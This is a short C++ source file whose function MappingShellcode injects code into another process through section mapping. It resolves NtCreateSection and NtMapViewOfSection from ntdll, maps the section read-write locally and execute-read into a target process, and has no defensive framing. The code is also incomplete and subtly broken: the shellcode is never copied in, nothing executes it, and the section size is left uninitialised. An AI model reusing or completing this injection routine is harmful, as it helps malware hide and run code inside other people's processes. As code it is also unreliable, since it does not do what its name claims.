#include "MemoryMapping.h"
#include "ResolveApi.h"

bool MappingShellcode(LPVOID lpShellcode, HANDLE hTargetProcess) {
	HMODULE hNtdll = GetModuleHandleA("ntdll");
	if (hNtdll == nullptr) { return false; }
	pNtCreateSection ntCreateSection = (pNtCreateSection)GetProcAddress(hNtdll, "NtCreateSection");
	if (ntCreateSection == nullptr) { return false; }
	NTSTATUS ntStatus;
	HANDLE hSection;
	LARGE_INTEGER size;
	ntStatus = ntCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, &size, PAGE_READWRITE, SEC_COMMIT, nullptr);
	if (!NT_SUCCESS(ntStatus) || hSection == nullptr) { return false; }
	PVOID localAddr = NULL;
	pNtMapViewOfSection ntMapViewOfSection = (pNtMapViewOfSection)GetProcAddress(hNtdll, "NtMapViewOfSection");
	if (ntMapViewOfSection == nullptr) { return false; }
	PVOID pLocalAddr = nullptr;
	ntStatus = ntMapViewOfSection(
		hSection,
		GetCurrentProcess(),
		&pLocalAddr,
		0,
		0,
		nullptr,
		(PSIZE_T)&size,
		ViewUnmap,
		0,
		PAGE_READWRITE
	);
	if (!NT_SUCCESS(ntStatus)) { return false; }

	PVOID remoteAddr = NULL;

	ntStatus = ntMapViewOfSection(
		hSection,
		hTargetProcess,
		&remoteAddr,
		0,
		0,
		NULL,
		(PSIZE_T)&size,
		ViewUnmap,
		0,
		PAGE_EXECUTE_READ
	);
	if (!NT_SUCCESS(ntStatus)) { return false; }

	return true;
}